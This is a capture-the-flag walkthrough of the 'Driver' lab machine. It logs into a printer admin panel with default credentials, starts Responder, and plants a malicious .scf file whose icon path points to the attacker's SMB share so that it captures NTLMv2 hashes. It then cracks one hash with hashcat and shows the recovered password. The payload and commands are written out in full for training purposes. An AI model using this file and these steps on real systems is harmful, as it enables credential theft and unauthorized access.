# Driver

1. Log into Print Server <admin:admin>

2. Startup SMB server
````
responder --lm -v -I tun0
````

3. Upload the malicious file to coordinate the target connecting back with SMB credentials

hash-stealer.scf
````     
[Shell]
Command=2
IconFile=\\10.10.14.221\share\malicious.ico
 
[Taskbar]
Command=ToggleDesktop
````

4. Retrieve the NTLMv2 hash to crack and analyze them
````
# hashid hash
--File 'hash'--
Analyzing 'tony::DRIVER:1255d3ee3e0cc5e6:19E11F033596F9077500C64883CCE0CE:0101000000000000A861735F5708D8019729CD459FF92C0B00000000020000000000000000000000'
[+] NetNTLMv2 
Analyzing 'tony::DRIVER:582c249800017afd:B2D95C9E9D94FC55A4C32A2424E93813:0101000000000000ADBD4B5E5708D8016DC5FD2CA51D96B500000000020000000000000000000000'
[+] NetNTLMv2 
Analyzing 'tony::DRIVER:5b6fd10e3315044f:14405515C217CB462001C03D46267539:01010000000000008DBA2F605708D80190236DBE368BF3A600000000020000000000000000000000'
[+] NetNTLMv2 
Analyzing 'tony::DRIVER:770784c9c8da82c8:DC39FF1CD2379F2A4C74E7C275BD1CB7:01010000000000002CB78C605708D8019D38DED2D83970E800000000020000000000000000000000'
[+] NetNTLMv2 
Analyzing 'tony::DRIVER:c3c63558d4c966a7:5870331B5D2D7E963055F9A02170599E:0101000000000000AA03145F5708D80133BA82492ED9079400000000020000000000000000000000'
[+] NetNTLMv2 
Analyzing 'tony::DRIVER:cdc9c2b80235ecf3:737C600F6146919A36B8C54F5CD5250C:01010000000000009E07B75E5708D80134E7D21478E43F8300000000020000000000000000000000'
[+] NetNTLMv2 
Analyzing 'tony::DRIVER:fcb87ba8bdca87ca:507592685F0D86EF0FFB77112C93F9C4:0101000000000000935DD05F5708D801502F9C7C96F95AF400000000020000000000000000000000'
[+] NetNTLMv2 
--End of file 'hash'--
````

5. Crack the hash
````
# hashcat --help | grep NTLM
   5500 | NetNTLMv1 / NetNTLMv1+ESS                        | Network Protocols
   5600 | NetNTLMv2                                        | Network Protocols
   1000 | NTLM                                             | Operating System
````
````
# hashcat -m 5600 -a 0 hash /root/rockyou.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, 5814/5878 MB (2048 MB allocatable), 1MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashfile 'hash' on line 1 (tony::...                                ): Token encoding exception
Hashfile 'hash' on line 2 (tony::...                                ): Token encoding exception
Hashfile 'hash' on line 3 (tony::...                                ): Token encoding exception
Hashfile 'hash' on line 5 (tony::...                                ): Token encoding exception
Hashfile 'hash' on line 6 (tony::...                                ): Token encoding exception
Hashfile 'hash' on line 7 (tony::...                                ): Token encoding exception
Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: /root/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 7 secs

TONY::DRIVER:770784c9c8da82c8:dc39ff1cd2379f2a4c74e7c275bd1cb7:01010000000000002cb78c605708d8019d38ded2d83970e800000000020000000000000000000000:liltony
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: TONY::DRIVER:770784c9c8da82c8:dc39ff1cd2379f2a4c74e...000000
Time.Started.....: Wed Jan 12 20:40:40 2022 (1 sec)
Time.Estimated...: Wed Jan 12 20:40:41 2022 (0 secs)
Guess.Base.......: File (/root/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   275.7 kH/s (1.00ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 31744/14344385 (0.22%)
Rejected.........: 0/31744 (0.00%)
Restore.Point....: 30720/14344385 (0.21%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: !!!!!! -> 225566

Started: Wed Jan 12 20:39:44 2022
Stopped: Wed Jan 12 20:40:42 2022
````



[Shell Command File](https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/)
